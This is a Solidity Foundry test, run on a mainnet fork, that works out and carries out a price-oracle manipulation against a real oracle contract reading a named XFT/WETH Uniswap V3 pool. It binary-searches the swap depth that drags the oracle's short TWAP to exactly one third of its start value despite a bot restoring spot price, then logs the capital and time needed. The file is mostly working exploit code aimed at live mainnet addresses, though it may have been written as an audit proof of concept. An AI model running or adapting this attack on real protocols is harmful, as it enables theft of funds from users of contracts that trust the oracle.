// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {MainnetForkTest} from "./MainnetFork.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";

interface IOracle {
    function getV3SqrtPrice(address uniswapV3Pool, uint32 intervalShort, uint32 intervalLong)
        external
        view
        returns (uint160 sqrtPriceX96);
}

IOracle constant ORACLE = IOracle(0x17881b9B731c78a546E5ab9dED28798b7C68CFA7);

/// Make getV3SqrtPrice read EXACTLY 1/3 of its starting value, against a bot that reverses the
/// attacker's swap every next block (block time = 12s), prioritising TIME.
///
/// getV3SqrtPrice = min(spot, shortTWAP(180s), longTWAP(1800s)). The bot can undo SPOT next block,
/// but it cannot un-record the low tick the attacker already wrote into the oracle's accumulator.
/// A single 12s spike at tick (tick0 - D) drags the 180s short-TWAP mean by D*12/180, and that drag
/// survives into the bot's block (spot restored) for the whole 180s the observation stays in window.
///
/// So EXACTLY 1/3 at minimum time IS possible: not by dumping to the pool floor (that overshoots to
/// ~0.07x), but by AIMING the spike at the one depth that lands the bot-block oracle on start/3. The
/// depth is DISCOVERED here by binary search (nothing is hand-computed): block 0 = one aimed spike,
/// block 1 = bot restores spot, oracle == start/3. Total time 24s (2 blocks), one push.
contract UniswapV3ManipulateTest is MainnetForkTest, IUniswapV3SwapCallback {
    uint32 internal constant SHORT_INTERVAL = 180;
    uint32 internal constant LONG_INTERVAL = 1800;
    uint256 internal constant BLOCK_TIME = 12;

    uint160 internal constant MAX_SQRT_PRICE_LIMIT = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;
    uint160 internal constant MIN_SQRT_PRICE_LIMIT = 4_295_128_740;

    IUniswapV3Pool public pool;
    address internal token0; // XFT
    address internal token1; // WETH

    function setUp() public override {
        super.setUp();
        pool = IUniswapV3Pool(0x701B319AFF36311F720f0a1ebD6636Dd84Bb3E8B);
        token0 = pool.token0();
        token1 = pool.token1();
        vm.label(address(pool), "XFT/WETH 0.3%");
        vm.label(address(ORACLE), "Oracle");
        vm.label(token0, "XFT");
        vm.label(token1, "WETH");
    }

    /// @inheritdoc IUniswapV3SwapCallback
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external override {
        if (msg.sender != address(pool)) revert();
        if (amount0Delta > 0) IERC20(token0).transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) IERC20(token1).transfer(msg.sender, uint256(amount1Delta));
    }

    /// @dev One attack attempt, isolated in a snapshot so the search can try many depths from the
    /// identical starting state: block 0 the attacker spikes spot down to `limit`; block 1 the bot
    /// reverses by the amount swapped (spot restored). Returns the oracle on that bot block + XFT spent.
    function _trySpike(uint160 limit) internal returns (uint160 oracleOnBotBlock, uint256 xftIn) {
        uint256 snap = vm.snapshotState();
        uint256 t0 = block.timestamp;

        vm.warp(t0 + BLOCK_TIME); // block 0: attacker aims the spike at `limit`
        uint256 x0 = IERC20(token0).balanceOf(address(this));
        uint256 w0 = IERC20(token1).balanceOf(address(this));
        pool.swap(address(this), true, type(int256).max, limit, "");
        xftIn = x0 - IERC20(token0).balanceOf(address(this));
        uint256 wethOut = IERC20(token1).balanceOf(address(this)) - w0;

        vm.warp(t0 + 2 * BLOCK_TIME); // block 1: bot reverses by the amount swapped -> spot restored
        if (wethOut > 0) pool.swap(address(this), false, int256(wethOut), MAX_SQRT_PRICE_LIMIT, "");

        oracleOnBotBlock = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        vm.revertToState(snap);
    }

    function test_BotFight_ExactThird_TimeFirst() public {
        uint160 start = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        (, int24 tick0,,,,,) = pool.slot0();
        uint160 target = uint160(uint256(start) / 3);

        pool.increaseObservationCardinalityNext(300);
        deal(token0, address(this), 1e40); // XFT inventory for the spike
        deal(token1, address(this), 1e33); // WETH float the bot uses to reverse

        // Discover the spike depth (ticks below the start tick) that lands the bot-block oracle on
        // start/3. Deeper => lower oracle, so the reading is monotonic in depth: binary search it.
        // Bracket: [1, maxDepth]. maxDepth = distance from the start tick down to MIN_TICK, i.e. the
        // deepest the pool can be pushed (getSqrtRatioAtTick is valid across this whole range). The
        // deep end necessarily overshoots below start/3, so the bracket is always valid.
        int24 lo = 1; // shallow: oracle stays ~start
        int24 hi = tick0 - TickMath.MIN_TICK; // == 782082 here; the maximum possible spike depth
        int24 depth;
        // The bracket width is < 2^20, so <= 20 halvings pin the depth to a single tick; cap at 24
        // for margin and stop as soon as lo and hi are adjacent (converged).
        for (uint256 iter; iter < 24 && lo + 1 < hi; iter++) {
            int24 mid = (lo + hi) / 2;
            (uint160 out,) = _trySpike(TickMath.getSqrtRatioAtTick(tick0 - mid));
            if (uint256(out) > uint256(target)) {
                lo = mid; // not deep enough
            } else {
                hi = mid; // deep enough; try shallower for exactness
                depth = mid;
            }
        }

        // --- Execute the discovered attack FOR REAL and MEASURE everything from the chain itself ---
        uint160 limit = TickMath.getSqrtRatioAtTick(tick0 - depth);
        uint256 tStart = block.timestamp;

        vm.warp(block.timestamp + BLOCK_TIME); // block 0: the single aimed spike
        uint256 x0 = IERC20(token0).balanceOf(address(this));
        uint256 w0 = IERC20(token1).balanceOf(address(this));
        pool.swap(address(this), true, type(int256).max, limit, "");
        uint256 capital = x0 - IERC20(token0).balanceOf(address(this)); // measured XFT spent
        uint256 wethOut = IERC20(token1).balanceOf(address(this)) - w0;

        vm.warp(block.timestamp + BLOCK_TIME); // block 1: bot reverses by the amount swapped
        pool.swap(address(this), false, int256(wethOut), MAX_SQRT_PRICE_LIMIT, ""); // spot restored

        uint160 finalOracle = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        uint256 elapsed = block.timestamp - tStart; // measured, not assumed

        emit log_named_uint("1) start getV3SqrtPrice (sqrtPriceX96)", start);
        emit log_named_uint("2) final getV3SqrtPrice (sqrtPriceX96)", finalOracle);
        emit log_named_uint("   final / start (x1000, 333 == exactly 1/3)", uint256(finalOracle) * 1000 / start);
        emit log_named_uint("3) time to change (seconds)", elapsed);
        emit log_named_int("   discovered spike depth (ticks)", depth);
        emit log_named_decimal_uint("4) initial capital (XFT in the single spike)", capital, 18);

        // Exactly start/3 (to tick resolution), read on a BOT block while spot is already restored.
        assertApproxEqRel(uint256(finalOracle), uint256(target), 0.005e18, "oracle did not land on exactly 1/3");
    }
}
